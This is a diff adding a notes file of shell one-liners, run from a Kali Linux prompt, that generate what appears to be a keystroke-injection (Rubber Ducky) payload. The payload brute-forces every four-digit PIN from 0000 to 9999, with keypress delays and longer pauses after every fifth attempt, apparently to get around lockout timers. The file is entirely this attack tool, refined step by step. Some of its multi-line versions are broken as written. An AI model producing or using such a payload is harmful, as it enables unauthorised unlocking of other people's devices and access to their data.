@@ -1,0 +1,51 @@
+┌──(kali㉿kali)-[~]
+└─$ echo {0000..0010}
+0000 0001 0002 0003 0004 0005 0006 0007 0008 0009 0010
+
+
+echo {0000..9999} | xargs -n 1 echo STRING
+
+OR
+
+echo {0000..9999} | xargs -n 1 echo STRING > payload.txt
+
+
+echo {0000..9999} | xargs -n 1 echo STRING | sed '0~5 s/$/\nWAIT/g'
+
+OR
+
+echo {0000..9999} | xargs -n 1 echo STRING | sed '0~5 s/$/\nWAIT/g' > payload.txt
+
+
+
+echo {0000..9999} | xargs -n 1 echo STRING | sed '0~5 s/$/\nWAIT/g' | sed '0~1 s/$/\nDELAY 1000\nENTER\nEnter/g'
+
+OR
+
+echo {0000..9999} | xargs -n 1 echo STRING | sed '0~5 s/$/\nWAIT/g' | sed '0~1 s/$/\nDELAY 1000\nENTER\nEnter/g' > payload.txt
+
+
+
+echo {0000..9999} 
+| xargs -n 1 echo STRING 
+| sed '0~5 s/$/\nWAIT/g' 
+| sed '0~1 s/$/\nDELAY 1000\nENTER\nEnter/g'
+| sed 's/WAIT/DELAY 5000\nENTER\nDELAY 5000\nENTER\nDELAY 5000\nENTER\nDELAY 5000\nENTER/g'
+
+OR
+
+
+echo {0000..9999} 
+| xargs -n 1 echo STRING 
+| sed '0~5 s/$/\nWAIT/g' 
+| sed '0~1 s/$/\nDELAY 1000\nENTER\nEnter/g'
+| sed 's/WAIT/DELAY 5000\nENTER\nDELAY 5000\nENTER\nDELAY 5000\nENTER\nDELAY 5000\nENTER/g' > payload.txt
+
+
+
+
+echo DELAY 5000 > payload.txt; echo {0000..9999} 
+| xargs -n 1 echo STRING 
+| sed '0~5 s/$/\nWAIT/g' 
+| sed '0~1 s/$/\nDELAY 1000\nENTER\nENTER/g'
+| sed 's/WAIT/DELAY 5000\nENTER\nDELAY 5000\nENTER\nDELAY 5000\nENTER\nDELAY 5000\nENTER/g' >> payload.txt
